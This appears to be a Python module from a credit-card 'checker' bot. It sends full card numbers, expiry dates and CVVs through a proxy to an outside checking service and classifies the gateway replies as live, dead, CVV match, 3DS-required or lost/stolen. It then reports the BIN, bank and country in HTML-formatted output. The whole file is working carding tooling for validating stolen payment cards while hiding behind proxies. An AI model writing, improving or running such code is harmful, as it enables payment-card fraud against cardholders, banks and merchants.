import aiohttp
import asyncio
from urllib.parse import urlencode
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tools.vbv_api import get_vbv_for_card

BASE_URL = "https://chk.vkrm.site/"

async def check_card_raw(card: str, proxy: str) -> dict:
    """
    Check a card using the Vkrm API - returns raw API response
    
    Args:
        card: Card string in format "4242424242424242|12|2030|123"
        proxy: Proxy URL like "http://user:pass@ip:port"
    
    Returns:
        dict with full API response
    """
    params = {"card": card, "proxy": proxy}
    url = f"{BASE_URL}?{urlencode(params)}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                data = await resp.json()
                return {"status_code": resp.status, "data": data}
    except asyncio.TimeoutError:
        return {"status_code": 408, "data": {"error": "Request timeout"}}
    except Exception as e:
        return {"status_code": 500, "data": {"error": str(e)}}


async def vkrm_check(cc: str, mes: str, exp: str, cvv: str, proxy: str = None) -> str:
    """
    Main gateway check function - returns formatted response with full card details
    
    Args:
        cc: Card number
        mes: Expiry month
        exp: Expiry year (2 or 4 digit)
        cvv: CVV code
        proxy: Proxy URL (required)
    
    Returns:
        Formatted response string with full card, VBV, CVV/CCN status
    """
    if not proxy:
        return "ERROR ❌|vkrm|Proxy required|----"
    
    year = f"20{exp}" if len(exp) == 2 else exp
    card_string = f"{cc}|{mes}|{year}|{cvv}"
    full_card = f"{cc}|{mes}|{exp}|{cvv}"
    
    response = await check_card_raw(card_string, proxy)
    status_code = response.get("status_code", 500)
    data = response.get("data", {})
    
    if status_code != 200:
        error = data.get("error", "Unknown error")
        return f"""❌ <b>ERROR</b>

<code>{full_card}</code>

<b>Error:</b> {error}
<b>Gateway:</b> Vkrm API"""
    
    hek_result = data.get("hek_result", {})
    cc_info = hek_result.get("credit_card", {})
    
    last4 = cc_info.get("last4", cc[-4:] if len(cc) >= 4 else "----")
    bin_num = cc_info.get("bin", cc[:6] if len(cc) >= 6 else "------")
    brand = cc_info.get("brandCode", "UNKNOWN")
    
    message = data.get("message", "").lower()
    message2 = data.get("message2", "")
    source = data.get("message_source", "vkrm")
    raw_message = data.get("message", "No response")
    
    if "confirmed success" in message2.lower():
        if "cvv" in message:
            status = "CVV ✅"
            cvv_status = "❌ Mismatch"
            ccn_status = "✅ Live"
            vbv_status = "Not Required"
        elif "insufficient" in message or "funds" in message:
            status = "CCN ✅"
            cvv_status = "✅ Match"
            ccn_status = "✅ Live (NSF)"
            vbv_status = "Passed"
        elif "approved" in message or "success" in message:
            status = "APPROVED ✅"
            cvv_status = "✅ Match"
            ccn_status = "✅ Live"
            vbv_status = "Passed"
        else:
            status = "CCN ✅"
            cvv_status = "✅ Match"
            ccn_status = "✅ Live"
            vbv_status = "Passed"
    elif "gateway rejected" in message:
        if "cvv" in message:
            status = "CVV ✅"
            cvv_status = "❌ Mismatch"
            ccn_status = "✅ Live"
            vbv_status = "Not Required"
        elif "fraud" in message or "risk" in message:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Blocked"
            vbv_status = "Fraud Block"
        else:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Dead"
            vbv_status = "Failed"
    elif "3d" in message or "3ds" in message or "enrolled" in message:
        status = "3DS ⚠️"
        cvv_status = "⚠️ Unknown"
        ccn_status = "✅ Live"
        vbv_status = "Required (3DS)"
    elif "declined" in message:
        if "do not honor" in message:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Dead"
            vbv_status = "Do Not Honor"
        elif "expired" in message:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Expired"
            vbv_status = "Card Expired"
        elif "invalid" in message:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Invalid"
            vbv_status = "Invalid Card"
        elif "lost" in message or "stolen" in message:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Lost/Stolen"
            vbv_status = "Blocked"
        else:
            status = "DECLINED ❌"
            cvv_status = "❌ N/A"
            ccn_status = "❌ Dead"
            vbv_status = "Generic Decline"
    elif "approved" in message or "success" in message:
        status = "APPROVED ✅"
        cvv_status = "✅ Match"
        ccn_status = "✅ Live"
        vbv_status = "Passed"
    else:
        status = "UNKNOWN ⚠️"
        cvv_status = "⚠️ Unknown"
        ccn_status = "⚠️ Unknown"
        vbv_status = "Unknown"
    
    vbv_info = await get_vbv_for_card(cc, mes, exp, cvv)
    real_vbv = vbv_info.get("vbv_status", vbv_status)
    bank = vbv_info.get("bank", "Unknown")
    country = vbv_info.get("country", "Unknown")
    country_emoji = vbv_info.get("country_emoji", "")
    card_type = vbv_info.get("card_type", "Unknown")
    
    return f"""<b>{status}</b>

<code>{full_card}</code>

<b>CVV:</b> {cvv_status}
<b>CCN:</b> {ccn_status}
<b>VBV:</b> {real_vbv}

<b>BIN:</b> {bin_num}
<b>Brand:</b> {brand}
<b>Type:</b> {card_type}
<b>Bank:</b> {bank}
<b>Country:</b> {country_emoji} {country}

<b>Gateway:</b> {source}
<b>Response:</b> {raw_message}"""
